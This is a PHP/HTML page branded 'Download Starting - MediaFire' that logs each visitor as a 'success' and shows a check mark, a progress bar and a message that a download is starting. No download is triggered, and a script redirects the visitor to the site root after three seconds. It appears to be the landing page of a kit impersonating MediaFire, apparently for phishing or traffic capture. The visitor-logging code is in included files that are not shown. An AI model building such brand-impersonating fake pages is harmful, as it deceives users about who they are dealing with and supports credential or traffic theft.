<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/functions.php';

// Log visitor
log_visitor('success');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Starting - MediaFire</title>
    <meta name="description" content="Your download will start shortly">
    <link rel="icon" href="/assets/mediafire-icon.svg" type="image/svg+xml">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .success-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        .success-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #4CAF50;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .success-icon svg {
            width: 40px;
            height: 40px;
            fill: white;
        }
        .success-title {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }
        .success-message {
            color: #666;
            margin-bottom: 30px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin-bottom: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: #1E88E5;
            width: 0%;
            animation: progress 3s forwards;
        }
        @keyframes progress {
            to { width: 100%; }
        }
        .redirect-message {
            color: #666;
            font-size: 14px;
        }
        .redirect-message a {
            color: #1E88E5;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="success-container">
        <div class="success-icon">
            <svg viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
            </svg>
        </div>
        <h1 class="success-title">Download Starting</h1>
        <p class="success-message">Your download will begin in a few seconds...</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <p class="redirect-message">
            If download doesn't start, <a href="/">click here</a>.
        </p>
    </div>

    <script>
        // Redirect after 3 seconds
        setTimeout(() => {
            window.location.href = '/';
        }, 3000);
    </script>
</body>
</html>
